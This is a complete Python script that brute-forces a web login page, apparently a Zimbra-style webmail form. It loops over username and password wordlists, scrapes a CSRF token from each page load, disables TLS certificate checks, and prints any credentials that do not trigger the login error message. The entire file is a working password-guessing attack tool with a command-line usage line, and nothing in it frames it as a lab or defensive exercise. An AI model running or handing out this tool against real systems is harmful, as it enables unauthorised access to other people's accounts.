import requests
import re
import sys
import urllib3

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def load_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"File {file_path} not found.")
        sys.exit(1)

def bruteforcer(url, usernames, passwords):
    session = requests.session()
    for username in usernames:
        for password in passwords:
            try:
                login = session.get(url, verify=False)
                login_token = re.search('login_csrf" value="(.*?)"', login.text).group(1)
                post_data = {
                    "username": username,
                    "password": password,
                    "loginOp": "login",
                    "login_csrf": login_token
                }
                valid = session.post(url, data=post_data)
                if "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password." not in valid.text:
                    print(f"Login successful!! \nValid Credentials:\n{username} : {password}")
                    return
                else:
                    print(f"Failed login for {username}:{password}")
            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python test.py <url> <usernames_file> <passwords_file>")
        sys.exit(1)

    url = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]

    usernames = load_file(usernames_file)
    passwords = load_file(passwords_file)

    bruteforcer(url, usernames, passwords)
